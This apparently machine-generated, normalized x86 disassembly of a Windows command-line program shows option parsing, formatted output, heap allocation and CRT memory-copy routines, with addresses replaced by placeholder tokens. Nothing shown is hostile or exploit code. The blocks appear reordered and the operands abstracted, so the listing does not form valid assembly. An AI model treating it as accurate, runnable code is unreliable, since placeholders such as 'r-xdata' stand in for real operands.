mov eax edi
call sub_40a390
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov eax [ rwxdata ]
push eax
push r--data
call sub_40c13f
lea esi [ ebx + 0x4 ]
jmp r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
jmp r-xdata
add esp 0x8
xor esi esi
jmp r-xdata
mov eax edi
call sub_40a390
cmp [ rwxdata ] 0x0
jne r-xdata
mov eax edi
call sub_40a390
mov edi eax
cmp edi esi
ja r-xdata
cmp eax [ ebp - 0x14 ]
je r-xdata
mov eax [ rwxdata ]
push eax
push r--data
call sub_40c13f
mov esi 0x5
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax esi
ja r-xdata
mov edx [ rwxdata ]
push edx
push r--data
call sub_40c13f
mov esi 0x7
jmp r-xdata
test edi edi
je r-xdata
cmp edi eax
ja r-xdata
mov ecx [ ebp - 0x20 ]
mov esi [ ebp - 0x24 ]
push ecx
push edi
sub esi edi
add esi ebx
push 0x1
push esi
call sub_40c622
add esp 0x10
cmp eax edi
ja r-xdata
jne r-xdata
add [ rwxdata ] eax
mov eax [ ebp - 0x18 ]
cmp edi eax
jae r-xdata
mov eax [ ebp - 0x34 ]
test eax eax
je r-xdata
movzx ecx [ ebp - 0xd ]
mov [ ebp - 0x1c ] eax
cmp ecx 0x2b
jne r-xdata
add [ rwxdata ] edi
test [ ebp - 0x30 ] 0x1
je r-xdata
push eax
push edi
push 0x1
push esi
call sub_40c994
add esp 0x10
cmp eax edi
jne r-xdata
cmp ecx 0x2d
jne r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_40a390
mov edi [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
test eax eax
jne r-xdata
cmp [ rwxdata ] 0x0
jne r-xdata
push eax
push edi
jmp r-xdata
cmp ecx 0x2e
jne r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push ebx
push edi
push esi
call sub_4029a0
jmp r-xdata
lea edx [ ebp - 0x1c ]
push edx
push ebx
push edi
push esi
call sub_402440
jmp r-xdata
mov esi [ ebp - 0x38 ]
test esi esi
jne r-xdata
push r--data
call sub_40bf8a
add eax 0x40
push eax
call sub_40c63f
add esp 0x10
jmp r-xdata
mov ecx [ ebp - 0x34 ]
test ecx ecx
je r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
push edx
push ebx
push edi
push esi
call sub_405510
jmp r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
push ebx
push edi
push esi
call sub_404ef0
jmp r-xdata
mov ecx [ ebp - 0x1c ]
add esp 0x10
test eax eax
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax edi
mov ecx esi
call sub_409d60
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
push 0x1
call sub_40ce63
add [ rwxdata ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push ecx
push eax
push 0x1
push ebx
call sub_40c994
mov ecx [ ebp - 0x18 ]
add esp 0x10
cmp eax ecx
jne r-xdata
lea ecx [ ebp - 0x1c ]
push ecx
push ebx
push edi
push esi
call sub_408310
lea eax [ ebp - 0x1c ]
push eax
push ebx
push edi
push esi
call sub_407c10
jmp r-xdata
mov edx [ rwxdata ]
push ecx
mov ecx [ ebp - 0x18 ]
push ecx
movzx ecx [ ebp - 0xd ]
push edi
push ecx
push eax
push edx
push r--data
call sub_40c13f
add esp 0x1c
mov esi 0x6
jmp r-xdata
cmp ecx [ ebp - 0x18 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
cmp [ rwxdata ] 0x0
jne r-xdata
push eax
push ecx
mov eax ecx
mov eax [ ebp - 0x18 ]
push ebx
movzx ebx [ ebp - 0xd ]
push esi
push ecx
mov esi eax
call sub_40a9b0
mov ebx [ ebp - 0x2c ]
add esp 0xc
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov ecx ebx
call sub_409d60
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
sub_40b020
push r--data
call sub_40c13f
mov eax [ rwxdata ]
push eax
push r--data
call sub_40c13f
mov ecx [ rwxdata ]
push ecx
push r--data
call sub_40c13f
mov edx [ rwxdata ]
push edx
push r--data
call sub_40c13f
mov eax [ rwxdata ]
push eax
push r--data
call sub_40c13f
push r--data
call sub_40c13f
push r--data
call sub_40c13f
push r--data
call sub_40c13f
push r--data
call sub_40c13f
push r--data
call sub_40c13f
push r--data
call sub_40c13f
push r--data
call sub_40c13f
add esp 0x40
push r--data
call sub_40c13f
push r--data
call sub_40c13f
add esp 0x8
push 0x1
call sub_40ce63
int3
sub_40b0e0
push r--data
push esi
call sub_40c35d
add esp 0x8
test eax eax
jne r-xdata
retn
mov eax [ rwxdata ]
push esi
push eax
push r--data
call sub_40c13f
add esp 0xc
push 0x1
call sub_40ce63
sub_40b110
push r--data
push esi
call sub_40c35d
add esp 0x8
test eax eax
jne r-xdata
retn
mov eax [ rwxdata ]
push esi
push eax
push r--data
call sub_40c13f
add esp 0xc
push 0x1
call sub_40ce63
sub_40b140
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
push ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov cl [ eax ]
push esi
push edi
mov ebx 0x1
mov edi 0x2d
mov esi 0x7
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] edi
mov [ ebp - 0xc ] esi
mov [ rwxdata ] eax
test cl cl
je r-xdata
push r--data
push r--data
push r--data
call sub_40c13f
push r--data
call sub_40c13f
push r--data
call sub_40c13f
add esp 0x14
mov [ rwxdata ] ebx
call sub_4099d0
test eax eax
je r-xdata
inc eax
mov [ ebp - 0x1c ] 0x40000
cmp [ ebp + 0x8 ] ebx
jle r-xdata
push r--data
call sub_40c13f
push r--data
call sub_40c13f
add esp 0x8
push 0x1
call sub_40ce63
cmp [ eax ] 0x0
je r-xdata
cmp cl 0x5c
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x2 ]
cmp edx eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
mov esi [ ecx + ebx * 4 ]
cmp [ esi ] 0x2d
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov [ rwxdata ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call sub_40b020
cmp [ ebp - 0x14 ] 0x0
mov [ ebp - 0x8 ] edi
je r-xdata
mov edx r--data
mov ecx esi
lea esp [ esp ]
cmp cl 0x2f
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
cmp ebx eax
jge r-xdata
mov esi [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jl r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ rwxdata ]
push edx
push eax
push r--data
call sub_40c13f
add esp 0xc
mov eax esi
mov ecx edi
call sub_40a4a0
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov esi [ ecx + eax * 4 ]
mov edi [ ecx + eax * 4 + 0x4 ]
push r--data
push esi
call sub_40c35d
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
nop
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_40b020
mov edx r--data
mov ecx esi
lea esp [ esp ]
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov esi [ ecx + eax * 4 ]
mov edi [ ecx + eax * 4 + 0x4 ]
call sub_40b0e0
mov esi edi
mov ebx eax
call sub_40b110
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x8 ]
mov esi eax
mov eax [ ebp - 0xc ]
push edx
push eax
push ecx
push ebx
mov eax esi
call sub_40a4f0
add esp 0x10
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
mov ecx [ rwxdata ]
push esi
push edi
push ecx
push r--data
call sub_40c13f
mov eax [ ebp - 0x10 ]
add esp 0x10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push r--data
push edi
call sub_40c35d
add esp 0x8
test eax eax
jne r-xdata
mov eax [ rwxdata ]
push esi
push eax
push r--data
call sub_40c13f
add esp 0xc
push 0x1
call sub_40ce63
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov ebx [ ecx + eax * 4 ]
inc eax
push r--data
push ebx
mov [ ebp - 0x4 ] eax
call sub_40c35d
mov esi eax
add esp 0x8
test esi esi
je r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax [ ebp + 0x8 ]
jl r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
test ebx ebx
je r-xdata
mov edx [ rwxdata ]
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
push edx
push eax
push rwxdata
push ecx
push r--data
call sub_40c13f
add esp 0x14
cmp [ rwxdata ] 0x1
jl r-xdata
push 0x0
push eax
mov ecx ebx
mov esi eax
call sub_40aac0
add esp 0x8
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
mov ecx [ rwxdata ]
push edi
push ecx
push r--data
call sub_40c13f
add esp 0xc
push 0x1
call sub_40ce63
mov edx [ rwxdata ]
push ebx
push edx
push r--data
call sub_40c13f
add esp 0xc
push 0x1
call sub_40ce63
mov edx [ ebp - 0x18 ]
fldz
push edx
fst [ rwxdata ]
push 0x0
fstp [ rwxdata ]
mov ecx esi
call sub_40aac0
mov edi eax
add esp 0x8
mov [ ebp - 0x10 ] edi
test edi edi
jne r-xdata
mov edx r--data
mov ecx esi
lea esp [ esp ]
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov ebx eax
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
test esi esi
je r-xdata
push ebx
call sub_40caef
add esp 0x4
mov edx [ rwxdata ]
push edi
push edx
push r--data
call sub_40c13f
add esp 0xc
fldz
fld [ rwxdata ]
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov edx [ rwxdata ]
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
push edx
push eax
push ecx
push r--data
call sub_40c13f
add esp 0x10
jmp r-xdata
push esi
call sub_40caef
add esp 0x4
test edi edi
jne r-xdata
mov eax [ rwxdata ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
push eax
push ecx
push rwxdata
push ebx
push edx
push r--data
call sub_40c13f
add esp 0x18
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
push esi
call sub_40caef
add esp 0x4
fstp st1
fstp st0
fmul [ r--data ]
fld [ r--data ]
fld [ rwxdata ]
fcom st1
fnstsw ax
fstp st1
test ah 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x8 ]
jl r-xdata
fldz
fld [ rwxdata ]
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov edx r--data
mov ecx esi
nop
mov [ rwxdata ] 0x1
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
sub esp 0x18
fxch st2
fstp [ esp + 0x10 ]
fxch st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push r--data
call sub_40c13f
add esp 0x1c
jmp r-xdata
fstp st2
fld st0
fdiv st2
fxch st2
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
fstp st0
fstp st0
fmul [ r--data ]
fld [ r--data ]
fld [ rwxdata ]
fcom st1
fnstsw ax
fstp st1
test ah 0x1
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
mov eax [ ebp - 0x18 ]
fxch st2
sub esp 0x18
fstp [ esp + 0x10 ]
fxch st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push eax
push r--data
call sub_40c13f
add esp 0x20
jmp r-xdata
fstp st2
fld st0
fdiv st2
fxch st2
mov edx r--data
mov ecx esi
lea edi [ ecx + 0x2b ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
mov edx r--data
mov ecx esi
lea edi [ ecx + 0x2b ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
mov edx r--data
mov ecx esi
lea edi [ ecx + 0x2d ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
mov edx r--data
mov ecx esi
lea edi [ ecx + 0x2d ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
mov edx r--data
mov ecx esi
lea edi [ ecx + 0x2e ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x31
jl r-xdata
lea edi [ ecx + 0x2e ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
mov edx r--data
mov ecx esi
nop
cmp al 0x39
jg r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
cmp [ esi + 0x2 ] 0x0
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
mov edx r--data
mov ecx esi
lea esp [ esp ]
mov [ ebp - 0xc ] 0xa
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
movsx eax al
sub eax 0x30
mov [ ebp - 0xc ] eax
jmp r-xdata
sbb ecx ecx
sbb ecx 0xffffffff
test bl bl
je r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
cmp al 0x62
jne r-xdata
mov [ ebp - 0xc ] 0xa
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov bl [ ecx + 0x1 ]
cmp bl [ edx + 0x1 ]
jne r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
cmp al 0x44
jne r-xdata
cmp [ esi + 0x2 ] 0x0
lea ecx [ esi + 0x2 ]
je r-xdata
test ecx ecx
jne r-xdata
add ecx 0x2
add edx 0x2
test bl bl
jne r-xdata
mov ecx r--data
mov eax esi
lea ecx [ ecx ]
cmp [ esi + 0x2 ] 0x0
lea ecx [ esi + 0x2 ]
je r-xdata
push ecx
call sub_40ca0e
lea edx [ eax - 0x400 ]
add esp 0x4
cmp edx 0x7ffc00
ja r-xdata
mov bl [ ecx ]
cmp bl [ edx ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
push ecx
call sub_40ca0e
add esp 0x4
cmp eax 0x1
jle r-xdata
push eax
mov eax [ rwxdata ]
push eax
push r--data
call sub_40c13f
add esp 0xc
push 0x1
call sub_40ce63
mov [ ebp - 0x1c ] eax
jmp r-xdata
inc [ rwxdata ]
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov ecx [ rwxdata ]
push eax
push ecx
push r--data
call sub_40c13f
add esp 0xc
push 0x1
call sub_40ce63
mov [ ebp - 0x18 ] eax
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_40b955
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_40d1fa
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40d1b8
pop ecx
mov [ esi ] eax
pop esi
sub_40b98f
mov edi edi
push ebp
mov ebp esp
cmp [ rwxdata ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
call sub_40d4fd
push 0x1e
call sub_40d34e
push 0xff
call sub_40cb8e
push eax
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
pop ebp
retn
inc eax
sub_40b9ce
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_40d592
pop ecx
call sub_40d1fa
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_40d4fd
push 0x1e
call sub_40d34e
push 0xff
call sub_40cb8e
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rwxdata ] eax
je r-xdata
push eax
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_40d1fa
mov [ eax ] esi
push ebx
call sub_40d592
pop ecx
test eax eax
jne r-xdata
cmp [ rwxdata ] 0x0
jne r-xdata
jmp r-xdata
call sub_40d1fa
mov [ eax ] esi
sub_40ba70
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rwxdata ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40baf4 ]
jmp [ ecx * 4 + jump_table_40bb74 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40bbe0 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_40bd7c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40bc80 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40bd7c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40bbe0 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40bd7c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40bbe0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40bbe0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40bbe0 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40bd7c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40bd7c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40bd7c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_40bdd1
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_40d9a9
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40d6cd
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_40be71
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e9ff
add esp 0x14
pop ebp
retn
sub_40be8f
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e9ff
add esp 0x14
pop ebp
retn
sub_40beae
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ea93
add esp 0x18
pop ebp
retn
sub_40becf
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x1c ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
